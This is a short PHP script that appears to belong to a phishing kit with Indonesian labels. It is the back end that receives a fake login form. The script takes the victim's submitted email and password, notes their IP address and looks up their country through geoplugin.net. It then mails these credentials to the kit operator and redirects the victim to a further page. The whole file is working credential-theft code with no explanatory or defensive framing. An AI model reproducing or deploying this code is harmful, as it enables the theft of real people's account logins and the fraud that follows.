<?php
include 'mail.php';

session_start();
$pass = $_POST['pass_input'];
$email = $_POST['email_id'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
$to = $Your_Email; // note the comma
$subject = "Akun Mexico DIKA # $ip";

$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip.""));
$negara = $details->geoplugin_countryCode;
$nama_negara = $details->geoplugin_countryName;
$kode_negara = strtolower($negara);




$message = "


#Login2
Email      : $email
Password   : $pass
Ip address : $ip
Negara: $nama_negara



";

if (!empty($email) || !empty($pass)) {
    // Mail it
    mail($to, $subject, $message);
}
/* if (!isset($_COOKIE["masuk"])){
	header("location:index.php");	
	setcookie("masuk","1");
} else {
	header("location:https://-.com/");
}
 */

 header("location:/inco5683z45rct2.php");
 
 
?>

